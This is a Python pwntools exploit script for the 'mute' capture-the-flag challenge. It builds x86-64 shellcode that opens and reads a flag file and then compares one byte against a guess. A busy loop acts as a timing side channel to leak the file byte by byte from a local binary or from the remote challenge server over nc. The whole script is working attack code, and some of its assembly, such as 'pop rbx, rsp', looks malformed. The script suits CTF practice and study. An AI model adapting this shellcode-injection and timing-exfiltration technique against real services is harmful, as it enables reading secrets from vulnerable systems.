#!/usr/bin/env python
import sys
import string
import datetime
import commands
from pwn import *

TIMEOUT = 3
SIZE = 0x7f
ASM_FILE = 'sleep-sc-output.asm'

context.log_level = 'error'

ASM_TEMPLATE = '''
; clear registers
xor rax, rax
xor rsi, rsi
xor rbx, rbx
xor rdi, rdi

; fd = open("./flag", 0, 0)
push rax
add rax, 2
mov rsi, 0x67616c662f2f2f2e
push rsi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall

; read(fd, $rsp, $SIZE)
mov rdi, rax
mov rsi, rsp
mov rdx, $SIZE
xor rax, rax
syscall

; verify one byte from the stack
add rsp, $POS
xor rax, rax
mov al, $BYTE
pop rbx, rsp
mov bl, bl
cmp al, bl
je L2
jmp done

L2:
nop
jmp L2

done:
nop
'''

def printFlag(flag, c='_'):
  startOfTerm = '\033[2J\033[0;0H'
  sys.stdout.write(startOfTerm + '%s%s\r' % (flag, c))
  nextLine = '\033[2;0H'
  sys.stdout.write(nextLine + ('*' * len(flag)) + '-' * len(c) + '_' * (SIZE - len(flag) - len(c)))
  sys.stdout.flush()

def getFlag(proc, flag):
  flagPosition = len(flag)
  template = ASM_TEMPLATE
  template = template.replace('$SIZE', str(SIZE))
  template = template.replace('$POS', str(flagPosition))

  for c in ' ' + string.lowercase + string.digits + string.uppercase + string.punctuation:
    printFlag(flag, c)
    result = template.replace('$BYTE', hex(ord(c)))
    f = open(ASM_FILE, 'wb')
    f.write(result)
    f.close()
    sc = commands.getoutput('rasm2 -b 64 -B -f {}'.format(ASM_FILE))

    r = process(proc)
    r.recvline()
    r.send(sc * (len(sc) - 1 * int(1000.0/len(sc) + 1)))

    try:
      r.recvline(timeout=TIMEOUT)
      r.close()
      return flag + c
    except:
      r.close()
      continue


def main():
  flag = ""

  if len(sys.argv) > 1 and sys.argv[1] == '--remote':
    proc = 'nc mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me 443'
  else:
    proc = './mute'

  while len(flag) < SIZE:
    nextFlag = getFlag(proc, flag)
    if nextFlag is None:
      printFlag(flag, '')
      print('\n\nDone!\n\n\t{}\n'.format(flag))
      sys.exit(0)
    else:
      flag = nextFlag
      printFlag(flag)


if __name__ == '__main__':
  main()
